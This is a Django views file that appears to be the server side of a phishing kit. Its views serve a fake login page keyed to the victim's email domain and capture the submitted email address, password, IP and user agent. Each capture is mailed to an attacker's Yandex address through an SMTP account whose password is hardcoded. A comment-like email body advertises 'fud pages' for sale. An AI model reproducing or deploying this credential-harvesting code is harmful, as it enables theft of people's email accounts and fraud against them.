from django.shortcuts import render
from django.http import HttpResponse
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from django.template.loader import get_template
from django.template import Context
from django.template.loader import render_to_string
#Create your views here.


def heonmo(request):
    ipza = request.META.get("HTTP_X_FORWARDED_FOR")
    autoza = request.GET["email"]
    domainza = autoza[autoza.index('@') + 1 : ]
    return render(request, 'index.html', {'email': autoza, 'domains': domainza})

def aiddn(request):
    ipya = request.META.get("HTTP_X_FORWARDED_FOR")
    emailya = request.POST["vpro"]
    passwordemailya = request.POST["vpros"]
    domainya = emailya[emailya.index('@') + 1 : ]
    sender_eya = "raygreenwood123@movelogins.online"
    sender_emailya = "raygreenwood123@movelogins.online"
    receiver_emailya = "trreportreport@yandex.com" # faithcooceo@gmail.com
    passwordya = "^qcpU_x6n#B{"
    useragentya = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW V1.01 EN API  0"
    message["From"] = sender_emailya
    message["To"] = receiver_emailya

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailya, 'useragent': useragentya, 'passaccess': passwordemailya, 'ipman': ipya})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("movelogins.online", 465) as server:
        server.login(sender_eya, passwordya)
        server.sendmail(sender_emailya, receiver_emailya, message.as_string())
        return render(request, 'indexx.html', {'email': emailya, 'domains': domainya})

def adzzddd(request):
    ipba = request.META.get("HTTP_X_FORWARDED_FOR")
    emailba = request.POST["vpro"]
    passwordemailba = request.POST["vpros"]
    domainba = emailba[emailba.index('@') + 1 : ]
    sender_eba = "raygreenwood123@movelogins.online"
    sender_emailba = "raygreenwood123@movelogins.online"
    receiver_emailba = "trreportreport@yandex.com"
    passwordba = "^qcpU_x6n#B{"
    useragentba = request.META['HTTP_USER_AGENT']
    message = MIMEMultipart("alternative")
    message["Subject"] = "NEW V1.01 EN API 0"
    message["From"] = sender_emailba
    message["To"] = receiver_emailba

    # Create the plain-text and HTML version of your message
    text = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    html = render_to_string('mail.html', {'emailaccess': emailba, 'passaccess': passwordemailba, 'useragent': useragentba, 'ipman': ipba})

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part1)
    message.attach(part2)

    # Create secure connection with server and send email
    with smtplib.SMTP_SSL("movelogins.online", 465) as server:
        server.login(sender_eba, passwordba)
        server.sendmail(sender_emailba, receiver_emailba, message.as_string())
    return render(request, 'Domain.html', {'domains': domainba})